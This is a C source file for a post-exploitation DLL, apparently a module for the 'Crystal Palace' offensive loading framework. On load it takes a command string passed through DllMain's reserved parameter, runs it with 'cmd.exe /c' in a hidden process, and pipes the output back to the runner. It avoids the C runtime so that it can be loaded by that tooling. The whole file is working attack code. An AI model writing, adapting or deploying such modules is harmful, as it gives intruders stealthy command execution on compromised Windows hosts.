/*
 * cmdexec.c — Crystal Palace post-ex DLL (CRT-free, kernel32-only)
 *
 * Runs a shell command received through lpReserved and writes stdout+stderr to
 * the inherited pipe handle supplied by the crystal_kit PICO runner.
 *
 * lpReserved format:  "<hwrite_hex>|<command>"
 *   e.g.  "1A2B|ipconfig /all"
 *
 * Only imports kernel32. No CRT and no memset/memcpy calls, so it links
 * cleanly through Crystal Palace.
 */

#include <windows.h>

static UINT_PTR hex_parse(const char *s)
{
    UINT_PTR v = 0;
    if (s[0] == '0' && (s[1] == 'x' || s[1] == 'X')) s += 2;
    for (; *s && *s != '|'; s++) {
        v <<= 4;
        if      (*s >= '0' && *s <= '9') v |= (UINT_PTR)(*s - '0');
        else if (*s >= 'a' && *s <= 'f') v |= (UINT_PTR)(*s - 'a' + 10);
        else if (*s >= 'A' && *s <= 'F') v |= (UINT_PTR)(*s - 'A' + 10);
    }
    return v;
}

BOOL WINAPI DllMain(HINSTANCE hDll, DWORD fdwReason, LPVOID lpvReserved)
{
    (void)hDll;

    if (fdwReason != DLL_PROCESS_ATTACH) {
        return TRUE;
    }

    const char *raw = (const char *)lpvReserved;
    if (raw == NULL || *raw == '\0') {
        return TRUE;
    }

    /* Split "<hwrite_hex>|<command>" */
    const char *sep = raw;
    while (*sep && *sep != '|') sep++;
    if (*sep != '|' || *(sep + 1) == '\0') {
        return TRUE;
    }

    HANDLE hWrite = (HANDLE)hex_parse(raw);
    if (hWrite == NULL || hWrite == INVALID_HANDLE_VALUE) {
        return TRUE;
    }

    const char *cmd = sep + 1;

    /* Build: "cmd.exe /c <cmd> 2>&1" */
    char fullCmd[8192];
    size_t pos = 0;
    const char *prefix = "cmd.exe /c ";
    while (*prefix && pos < sizeof(fullCmd) - 1) fullCmd[pos++] = *prefix++;
    while (*cmd && pos < sizeof(fullCmd) - 1) fullCmd[pos++] = *cmd++;
    const char *suffix = " 2>&1";
    while (*suffix && pos < sizeof(fullCmd) - 1) fullCmd[pos++] = *suffix++;
    fullCmd[pos] = '\0';

    STARTUPINFOA si;
    {
        volatile unsigned char *z = (volatile unsigned char *)&si;
        for (size_t i = 0; i < sizeof(si); i++) z[i] = 0;
    }
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESTDHANDLES;
    si.hStdInput = NULL;
    si.hStdOutput = hWrite;
    si.hStdError = hWrite;

    PROCESS_INFORMATION pi;
    {
        volatile unsigned char *z = (volatile unsigned char *)&pi;
        for (size_t i = 0; i < sizeof(pi); i++) z[i] = 0;
    }

    if (CreateProcessA(NULL, fullCmd, NULL, NULL, TRUE, CREATE_NO_WINDOW,
                       NULL, NULL, &si, &pi)) {
        WaitForSingleObject(pi.hProcess, 60000);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
    }

    /* The PICO runner owns hWrite and closes it after we return to signal EOF
     * on the read end of the pipe. */
    return TRUE;
}
